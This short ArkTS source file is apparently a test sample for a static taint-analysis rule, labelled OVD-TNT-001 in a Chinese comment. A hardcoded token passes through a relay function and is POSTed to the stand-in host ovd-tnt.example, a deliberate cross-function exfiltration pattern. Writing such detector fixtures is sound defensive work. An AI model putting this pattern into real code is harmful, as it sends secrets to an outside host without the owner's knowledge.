// VULN: OVD-TNT-001 跨函数污点链——令牌常量在 source 函数、外传 sink 在另一函数，
// 中经 relay 变换；单函数内 call+constant 不可 AND，需要过程间分析（interproc 规则）。
// 孪生 001S 同构，但 source 返回派生聚合值、sink 落点为聚合端点。
import http from '@ohos.net.http';

const TOKEN = 'tnt_tok_ovd_e5a91b7f';

function ovdTntSource(): string {
  return TOKEN;
}

function ovdTntRelay(seed: string): string {
  return `relay(${seed.length})=${seed}`;
}

export async function ovdTntSink(): Promise<string> {
  const payload: string = ovdTntRelay(ovdTntSource());
  const req: http.HttpRequest = http.createHttp();
  await req.request('https://ovd-tnt.example/ingest', {
    method: http.RequestMethod.POST,
    header: { 'x-tnt-flow': '1' },
    extraData: payload
  });
  req.destroy();
  return 'tnt sink posted';
}
